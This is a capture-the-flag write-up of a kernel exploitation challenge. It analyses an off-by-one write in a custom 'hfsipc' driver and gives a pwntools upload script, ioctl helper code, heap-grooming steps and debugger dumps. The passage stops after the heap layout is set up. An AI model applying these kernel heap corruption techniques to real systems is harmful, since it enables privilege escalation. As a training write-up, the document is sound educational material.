<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>Midnightsun CTF 2019 - hfs ipc | kileak</title>





<meta name="description" content="Midnightsun CTF 2019 - hfs ipc">


<meta name="keywords" content="Midnightsun CTF 2019">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2019/midnight-hfsipc/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">Midnightsun CTF 2019 - hfs ipc</h1>
      <p class="post-meta">Apr 6, 2019</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>Points: 558
Solves: 18
<!--break--></p>

  <p>Haikus are easy. But sometimes they don’t make sense. Microwave noodles!</p>

  <p>Attachment: <a href="https://kileak.github.io/assets/midnight19/hfsipc/hfsipc.tar.gz">hfsipc.tar.gz</a> <a href="https://kileak.github.io/assets/midnight19/hfsipc/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/midnight19/hfsipc/pwn.c">pwn.c</a> <a href="https://kileak.github.io/assets/midnight19/hfsipc/pwn_clean.c">pwn_clean.c</a></p>
</blockquote>

<figure class="highlight"><pre><code class="language-text" data-lang="text">                      Midnight Sun CTF presents...

 ██░ ██   █████▒ ██████     ██▓ ██▓███   ▄████▄  
▓██░ ██▒▓██   ▒▒██    ▒    ▓██▒▓██░  ██▒▒██▀ ▀█  
▒██▀▀██░▒████ ░░ ▓██▄      ▒██▒▓██░ ██▓▒▒▓█    ▄ 
░▓█ ░██ ░▓█▒  ░  ▒   ██▒   ░██░▒██▄█▓▒ ▒▒▓▓▄ ▄██▒
░▓█▒░██▓░▒█░   ▒██████▒▒   ░██░▒██▒ ░  ░▒ ▓███▀ ░
 ▒ ░░▒░▒ ▒ ░   ▒ ▒▓▒ ▒ ░   ░▓  ▒▓▒░ ░  ░░ ░▒ ▒  ░
 ▒ ░▒░ ░ ░     ░ ░▒  ░ ░    ▒ ░░▒ ░       ░  ▒   
 ░  ░░ ░ ░ ░   ░  ░  ░      ▒ ░░░       ░        
 ░  ░  ░             ░      ░           ░ ░      
                                        ░        
user@hfs:~$ </code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">hfsipc</code> was a kernel pwn challenge. We were provided the image, which contained a custom driver <code class="language-plaintext highlighter-rouge">hfsipc.ko</code>, which obviously was the vulnerable part in this challenge.</p>

<p>The module would set up a device <code class="language-plaintext highlighter-rouge">/dev/hfs</code> which could be communicated with through <code class="language-plaintext highlighter-rouge">ioctl</code>. For accessing the device we had 4 different access modes</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define CHANNEL_CREATE 0xABCD0001
#define CHANNEL_DELETE 0xABCD0002
#define CHANNEL_READ   0xABCD0003
#define CHANNEL_WRITE  0xABCD0004</span></code></pre></figure>

<p>To pass parameters to the corresponding functions an input parameter struct can be used</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">channel_info</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">id</span><span class="p">;</span>       <span class="c1">// used to identify the corresponding channel</span>
    <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>     <span class="c1">// used for channel creation</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>  <span class="c1">// used for read and write</span>
<span class="p">};</span></code></pre></figure>

<p>With <code class="language-plaintext highlighter-rouge">CHANNEL_CREATE</code> we can create new <code class="language-plaintext highlighter-rouge">hfs</code> channels and allocate kernel memory, which will serve as a data buffer for those channels. Obviously with <code class="language-plaintext highlighter-rouge">CHANNEL_DELETE</code> those channels can be freed again.</p>

<p>With <code class="language-plaintext highlighter-rouge">CHANNEL_READ</code> and <code class="language-plaintext highlighter-rouge">CHANNEL_WRITE</code> we can read and write to/from the data buffers.</p>

<p>Nothing special in the channel creation, so I’ll skip the reversing on that one. It will just allocate kernel memory and store the information about this channel in an object, which will look like this</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">channel_object</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>    
<span class="p">};</span></code></pre></figure>

<p>With the corresponding <code class="language-plaintext highlighter-rouge">id</code> used at channel creation, we can then read and write to those backing buffers.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span> <span class="n">flag</span> <span class="o">==</span> <span class="n">CHANNEL_READ</span> <span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">in_param1</span><span class="p">,</span> <span class="n">src_param</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
        <span class="n">channel_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">channel_obj</span> <span class="o">=</span> <span class="n">hfs_channels</span><span class="p">[</span><span class="n">channel_index</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span> <span class="n">channel_obj</span> <span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">in_param1</span><span class="p">.</span><span class="n">ID</span> <span class="o">==</span> <span class="n">channel_obj</span><span class="o">-&gt;</span><span class="n">ID</span><span class="p">)</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">channel_index</span> <span class="o">==</span> <span class="mi">2048</span> <span class="p">)</span>
                <span class="k">goto</span> <span class="n">LABEL_22</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">channel_size</span> <span class="o">=</span> <span class="n">channel_obj</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">in_param1</span><span class="p">.</span><span class="n">Size</span> <span class="o">&lt;=</span> <span class="n">channel_size</span> <span class="p">)</span>
        <span class="n">channel_size</span> <span class="o">=</span> <span class="n">in_param1</span><span class="p">.</span><span class="n">Size</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">in_param1</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">channel_obj</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">channel_size</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">HFS_READ_FROM_CHANNEL</span><span class="p">,</span> <span class="n">channel_size</span><span class="p">);</span>            
            <span class="k">goto</span> <span class="n">LABEL_23</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Nothing special here also, it will just search for the corresponding channel matching our input <code class="language-plaintext highlighter-rouge">id</code> and then read the specified size into our userland buffer, which we passed in the input object.</p>

<p>Things get more interesting in <code class="language-plaintext highlighter-rouge">CHANNEL_WRITE</code></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="n">CHANNEL_WRITE</span><span class="p">)</span> <span class="p">{</span>  
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">in_param1</span><span class="p">,</span> <span class="n">src_param</span><span class="p">,</span> <span class="mi">24LL</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">channel_idx</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">channel_obj</span> <span class="o">=</span> <span class="n">hfs_channels</span><span class="p">[</span><span class="n">channel_idx</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span> <span class="n">channel_obj2</span> <span class="p">)</span>       <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span> <span class="n">in_param1</span><span class="p">.</span><span class="n">ID</span> <span class="o">==</span> <span class="n">channel_obj2</span><span class="o">-&gt;</span><span class="n">ID</span> <span class="p">)</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">channel_idx3</span> <span class="o">==</span> <span class="mi">2048</span> <span class="p">)</span>
                <span class="k">goto</span> <span class="n">LABEL_22</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">in_param1</span><span class="p">.</span><span class="n">Size</span> <span class="o">&lt;=</span> <span class="n">channel_obj2</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">channel_obj2</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">in_param1</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">in_param1</span><span class="p">.</span><span class="n">Size</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">HFS_WRITE_CHANNEL</span><span class="p">,</span> <span class="n">in_param1</span><span class="p">.</span><span class="n">Size</span><span class="p">);</span>
                <span class="k">goto</span> <span class="n">LABEL_23</span><span class="p">;</span>
            <span class="p">}</span>            
        <span class="p">}</span>
    <span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">in_param1</span><span class="p">.</span><span class="n">Size</span> <span class="o">&lt;=</span> <span class="n">channel_obj2</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span></code></pre></figure>

<p>We got an <code class="language-plaintext highlighter-rouge">off-by-one</code> bug here, which will allow us to write one byte more to the channel, than the allocated buffer can hold. With this we can overwrite one byte in any data following the current kernel memory buffer :)</p>

<p>We should now be ready to start pwning this, but we’ll have to make some preparations to be able to upload our binary to the vm in order to communicate with the device.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">base64</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"hfsipc-01.play.midnightsunctf.se"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">8192</span>

<span class="k">def</span> <span class="nf">compile</span><span class="p">():</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Compile"</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"musl-gcc -w -s -static -o3 pwn.c -o pwn"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Upload"</span><span class="p">)</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"pwn"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

    <span class="n">encoded</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">encoded</span><span class="p">),</span> <span class="mi">300</span><span class="p">):</span>
        <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"%d / %d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">encoded</span><span class="p">)))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"echo %s &gt;&gt; benc"</span> <span class="o">%</span> <span class="p">(</span><span class="n">encoded</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">300</span><span class="p">]))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"$ "</span><span class="p">)</span>

    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat benc | base64 -d &gt; bout"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"$ "</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"chmod +x bout"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"$ "</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">success</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"$ "</span><span class="p">)</span>

    <span class="nb">compile</span><span class="p">()</span>
    <span class="n">upload</span><span class="p">()</span>

    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    
    <span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./chall"</span><span class="p">)</span>
        <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>

<p>This script will compile our code with <code class="language-plaintext highlighter-rouge">musl-gcc</code> to save some space, which makes it easier when uploading to the remote vm. Afterwards it will just base64-encode the binary and puts it on the server, decodes it again and makes it executable. Pretty default for kernel challenges.</p>

<p>Let’s get started with device communication</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span>
<span class="cp">#define CHANNEL_CREATE 0xABCD0001
#define CHANNEL_DELETE 0xABCD0002
#define CHANNEL_READ   0xABCD0003
#define CHANNEL_WRITE  0xABCD0004
</span>
<span class="k">struct</span> <span class="n">channel_info</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">ioctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">request</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">param</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">param</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Create a new hfs channel</span>
<span class="kt">void</span> <span class="nf">create_channel</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">channel_info</span> <span class="n">channel</span><span class="p">;</span>

    <span class="n">channel</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">channel</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANNEL_CREATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channel</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Delete hfs channel</span>
<span class="kt">void</span> <span class="nf">delete_channel</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">long</span> <span class="n">id</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANNEL_DELETE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">id</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Read from hfs channel into dest</span>
<span class="kt">void</span> <span class="nf">read_channel</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">channel_info</span> <span class="n">channel</span><span class="p">;</span>

    <span class="n">channel</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">channel</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
    <span class="n">channel</span><span class="p">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANNEL_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channel</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Write into hfs channel from src</span>
<span class="kt">void</span> <span class="nf">write_channel</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">channel_info</span> <span class="n">channel</span><span class="p">;</span>

    <span class="n">channel</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">channel</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
    <span class="n">channel</span><span class="p">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">src</span><span class="p">;</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANNEL_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channel</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Open hfs device</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/hfs"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Create initial channels</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
    <span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
    <span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
    <span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
    <span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
    <span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
    
    <span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
    <span class="n">write_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>

    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Uploading and executing the binary and checking output of <code class="language-plaintext highlighter-rouge">dmesg</code></p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">HFS IPC: created 0
HFS IPC: created 1
HFS IPC: created 2
HFS IPC: created 3
HFS IPC: created 4
HFS IPC: created 5
HFS IPC: wrote 32 bytes to 0</code></pre></figure>

<p>So, communication seems to be working and we wrote some data to kernel memory.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">pwndbg&gt; x/30gx 0xffffffffa0002360
0xffffffffa0002360:	0xffff8800001c6460	0xffff8800001c6480  &lt;== hfs_channels
0xffffffffa0002370:	0xffff8800001c64a0	0xffff8800001c64c0
0xffffffffa0002380:	0xffff8800001c64e0	0xffff8800001c6500
0xffffffffa0002390:	0x0000000000000000	0x0000000000000000
0xffffffffa00023a0:	0x0000000000000000	0x0000000000000000


pwndbg&gt; x/30gx 0xffff8800001c6460
0xffff8800001c6460:	0x0000000000000001	0xffff8800001ba300  &lt;== Channel 1 / Buffer 1
0xffff8800001c6470:	0x0000000000000100	0xff5dc125f80330ca  &lt;== Size 1
0xffff8800001c6480:	0x0000000000000002	0xffff8800001ba400  &lt;== Channel 2 / Buffer 2
0xffff8800001c6490:	0x0000000000000100	0xe19719472e34ad89  &lt;== Size 2
0xffff8800001c64a0:	0x0000000000000003	0xffff8800001ba500  &lt;== Channel 3 / Buffer 3
0xffff8800001c64b0:	0x0000000000000100	0x1a512b6f8988c807  &lt;== Size 3
0xffff8800001c64c0:	0x0000000000000004	0xffff8800001ba600  &lt;== Channel 4 / Buffer 4 
0xffff8800001c64d0:	0x0000000000000100	0x38d251e5ab5fac52  &lt;== Size 4
0xffff8800001c64e0:	0x0000000000000005	0xffff8800001ba700  &lt;== Channel 5 / Buffer 5
0xffff8800001c64f0:	0x0000000000000100	0xe5f716d6aa5fdd5d  &lt;== Size 5
0xffff8800001c6500:	0x0000000000000006	0xffff8800001ba800  &lt;== Channel 6 / Buffer 6
0xffff8800001c6510:	0x0000000000000100	0x6be30cd9e02c88d6  &lt;== Size 6


pwndbg&gt; x/30gx 0xffff8800001ba300
0xffff8800001ba300:	0x4141414141414141	0x4141414141414141  &lt;== Channel 1 buffer data
0xffff8800001ba310:	0x4141414141414141	0x4141414141414141
0xffff8800001ba320:	0x0000000000000000	0x0000000000000000
0xffff8800001ba330:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>Since the channel objects and the buffer objects have different sizes, they are allocated in different places.</p>

<p>Let’s create some channels with buffer sizes matching the size of channel objects instead :)</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
<span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
<span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
<span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
<span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
<span class="n">create_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>

<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
<span class="n">write_channel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">pwndbg&gt; x/30gx 0xffff8800001c6460
0xffff8800001c6460:	0x0000000000000001	0xffff8800001c6480  &lt;== Channel 1 Object
0xffff8800001c6470:	0x0000000000000020	0xff5dc125f80330ca
0xffff8800001c6480:	0x4141414141414141	0x4141414141414141  &lt;== Channel 1 Buffer
0xffff8800001c6490:	0x4141414141414141	0x4141414141414141
0xffff8800001c64a0:	0x0000000000000002	0xffff8800001c64c0  &lt;== Channel 2 Object
0xffff8800001c64b0:	0x0000000000000020	0x1a512b6f8988c807  
0xffff8800001c64c0:	0x0000000000000000	0x0000000000000000  &lt;== Channel 2 Buffer
0xffff8800001c64d0:	0x0000000000000000	0x0000000000000000
0xffff8800001c64e0:	0x0000000000000003	0xffff8800001c6500
0xffff8800001c64f0:	0x0000000000000020	0xe5f716d6aa5fdd5d
0xffff8800001c6500:	0x0000000000000000	0x0000000000000000
0xffff8800001c6510:	0x0000000000000000	0x0000000000000000
0xffff8800001c6520:	0x0000000000000004	0xffff8800001c6540</code></pre></figure>

<p>Neat, now the <code class="language-plaintext highlighter-rouge">channel objects</code> and their backing <code class="language-plaintext highlighter-rouge">buffer</code> are nicely aligned behind each other.</p>

<p>This should make our <code class="language-plaintext highlighter-rouge">off by one</code> a little bit more powerful :)</p>

<p>Let’s free one of the channels</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Free channel 3</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
